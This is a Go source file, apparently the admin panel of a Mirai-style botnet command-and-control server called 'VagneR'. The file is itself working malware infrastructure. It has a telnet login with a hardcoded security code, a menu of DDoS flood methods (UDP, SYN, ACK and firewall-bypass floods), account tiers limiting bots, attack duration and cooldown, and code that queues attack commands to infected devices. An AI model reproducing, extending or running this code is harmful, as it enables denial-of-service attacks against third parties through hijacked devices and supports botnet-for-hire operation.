package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()


    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[0m\033[2J\033[1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Security Step, Please Enter The Security Code.\007")))
	this.conn.Write([]byte("Security Code: "))
    secret, err := this.ReadLine(false)
    if err != nil {
        return
    }


    if len(secret) > 20 {
        return
    }

    if secret != "vagner" {
        return
    }
	var attackStatus int = 0
    attackStatusPointer := &attackStatus
    this.conn.Write([]byte("\033[0m\033[2J\033[1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0;School Project.\007")))
    this.conn.Write([]byte("Username: "))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte("Password: "))
  password, err := this.ReadLine(true)
  if err != nil {
    return
  }
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))

	var loggedIn bool
	var userInfo AccountInfo




	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\033[2J\033[1H"))
		time.Sleep(1000 * time.Millisecond)
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	time.Sleep(1 * time.Millisecond)

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Devices - %d/∞ Total Attacks\007", BotCount, database.fetchAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Devices - %d/∞ Total Attacks\007", BotCount, database.fetchAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()



	// banner
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[0m"))



	for {
		var botCatagory string
		var botCount int

		this.conn.Write([]byte("\033[0mbotnet: \033[0m"))
		cmd, err := this.ReadLine(false)
		
		if err != nil || cmd == "?" || cmd == "help" || cmd == "HELP" || cmd == "methods" {
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[0mVagneR Available Attacks: \r\n"))
			this.conn.Write([]byte("\033[0m udpflood  : generic udp plain flood\r\n"))
			this.conn.Write([]byte("\033[0m udphex    : complex udp hex flood\r\n"))
			this.conn.Write([]byte("\033[0m udprand   : udp flood creates multiple sockets with random payload\r\n"))
			this.conn.Write([]byte("\033[0m udpwizard : advanced udp flood with random payloads\r\n"))
			this.conn.Write([]byte("\033[0m vseflood  : valve source engine query udp flood \r\n"))
			this.conn.Write([]byte("\033[0m synflood  : tcp syn flood, Flags (URG, ACK, PSH, RST, SYN, FIN)\r\n"))
			this.conn.Write([]byte("\033[0m ackflood  : tcp ackflood with random payload data\r\n"))
			this.conn.Write([]byte("\033[0m wraflood  : tcp wra flood\r\n"))
			this.conn.Write([]byte("\033[0m tcpstream : tcp packet stream flood\r\n"))
			this.conn.Write([]byte("\033[0m tcpsack   : tcpsack flood bypass mitigated networks/firewall\r\n"))
			this.conn.Write([]byte("\033[0m socket    : tcp handshake with socket\r\n"))
			this.conn.Write([]byte("\033[0m handshake : tcp syn+ack handshake flood \r\n"))
			this.conn.Write([]byte("\033[0m tcppsh    : tcp syn+psh handshake with various TCP flags\r\n\n"))
			this.conn.Write([]byte("\033[0mAvailable Method Flags:\r\n"))
			this.conn.Write([]byte("\033[0m  -   handshake [target] [time] [ '?' for options]\r\n"))
			this.conn.Write([]byte("\033[0m Ex : handshake 127.0.0.1 1200 ?\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
        }
        if err != nil || cmd == "clear" || cmd == "cls" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\033[0m"))
            continue
        }

		if err != nil || cmd == "LOGOUT" || cmd == "logout" || cmd == "EXIT" || cmd == "exit" {
			return
		}

		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("removeuser      - remove a user.\r\n"))
			this.conn.Write([]byte("addbasic        - Add a Basic Acount.\r\n"))
			this.conn.Write([]byte("addadmin        - Add a Admin Account.\r\n"))
			this.conn.Write([]byte("users/members 	- Show All Network's Users.\r\n"))
			this.conn.Write([]byte("block/unblock 	- Block/Unblock Attacks On A Ip Range.\r\n"))
			this.conn.Write([]byte("floods enable 	- Enable Attacks.\r\n"))
			this.conn.Write([]byte("floods disable 	- disable Attacks.\r\n"))
			continue
		}

		if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[0mFloods Have Already Been Enabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[0mFloods Have Already Been Disabled\033[37;1m.\r\n"))
            continue
        }
        if attackStatus < 1 && userInfo.admin > 0 && cmd == "floods disable" {
            this.conn.Write([]byte("\033[0mFloods Successfully Disabled\033[37;1m.\r\n"))
            *attackStatusPointer = 1
            continue
        }
        if attackStatus > 0 && userInfo.admin > 0 && cmd == "floods enable" {
            this.conn.Write([]byte("\033[0mFloods Successfully Enabled\033[37;1m.\r\n"))
            *attackStatusPointer = 0
            continue
        }
        if attackStatus > 0 && strings.Contains(cmd, "vseflood") || attackStatus > 0 && strings.Contains(cmd, "synflood") || attackStatus > 0 && strings.Contains(cmd, "ackflood") || attackStatus > 0 && strings.Contains(cmd, "udpflood") || attackStatus > 0 && strings.Contains(cmd, "udphex") || attackStatus > 0 && strings.Contains(cmd, "tcpsack") || attackStatus > 0 && strings.Contains(cmd, "udprand") || attackStatus > 0 && strings.Contains(cmd, "socket") || attackStatus > 0 && strings.Contains(cmd, "tcpstream") || attackStatus > 0 && strings.Contains(cmd, "handshake") || attackStatus > 0 && strings.Contains(cmd, "tcppsh"){
            this.conn.Write([]byte("\033[0mSelected Flood Has Been Disabled By The Admin\033[0m.\r\n"))
            continue
        }

		if userInfo.admin == 1 && cmd == "block" {
			this.conn.Write([]byte("\033[0mPut the IP (next prompt will be asking for prefix):\033[01;37m "))
			new_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the Netmask (after slash):\033[01;37m "))
			new_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to block all attacks attempts to this ip range: \033[97m" + new_pr + "/" + new_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.BlockRange(new_pr, new_nm) {
				this.conn.Write([]byte(fmt.Sprintf("\033[0;36m%s\033[0m\r\n", "An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mSuccessful!\033[0m\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "unblock" {
			this.conn.Write([]byte("\033[0mPut the prefix that you want to remove from whitelist: \033[01;37m"))
			rm_pr, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mPut the netmask that you want to remove from whitelist (after slash):\033[01;37m "))
			rm_nm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mWe are going to unblock all attacks attempts to this ip range: \033[97m" + rm_pr + "/" + rm_nm + "\r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.UnBlockRange(rm_pr) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove that ip range\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mSuccessful!\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "devices" || cmd == "bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("%s: %d\r\n", k, v)))
			}
			continue
		}

		if cmd == "" {
			continue
		}

		if cmd == "@" {
			continue
		}

		if len(cmd) > 50 {
            this.conn.Write([]byte("\033[0mCommand Exceeds The Max String Size.")) // dont want someone tryna spam more than 50 chars, it should be enough anyways
            fmt.Println("\033[0m " + username + " Just Attempted To Exceed The Max Command Size, Their Session Has Been Closed")
            time.Sleep(time.Duration(1000) * time.Millisecond)
            return
        }

		if userInfo.admin == 1 && cmd == strings.ToLower("addbasic") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for INFINITE time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Network: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm (y/n): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[92mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[92mUser created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == strings.ToLower("addadmin") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Attack Network.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)// @E1itex
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Infinite flood time. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Networ: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm (y/n): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("User created! \r\n"))
			}
			continue
		}
		if isAdmin(userInfo) && cmd == strings.ToLower("removeuser") {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		botCount = userInfo.maxBots
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("%s\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
						var AttackCount int
                        if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                        } else {
                            AttackCount = clientList.Count()
                        }
                        this.conn.Write([]byte(fmt.Sprintf("\033[0mInitiating Attack With \033[31m%d \033[0mConnected Devices\033[0m\r\n", AttackCount)))
                        fmt.Println("\033[93m[ VagnaR Attack Logging system ] >> Command sent by \033[1;91m[" + username + "]\033[31m using command line.\033[0m\n")
					clientList.QueueBuf(buf, botCount, botCatagory)
				} else {
					this.conn.Write([]byte(fmt.Sprintf("\033[0;36mThis address is whitelisted by our botnet which means you can't attack none of ip's in this range.\033[0;31m\r\n")))
					fmt.Println("" + username + " tried to attack on one of whitelisted ip ranges")
				}

				
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 500000)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos : bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos : bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^'
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++
                buf[bufPos] = '['
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}

func isAdmin(userInfo AccountInfo) bool {
	if userInfo.admin == 1 {
		return true
	}
	return false
}

func getRank(userInfo AccountInfo) string {
	if userInfo.admin == 1 {
		return "Admin"
	}
	return "User"
}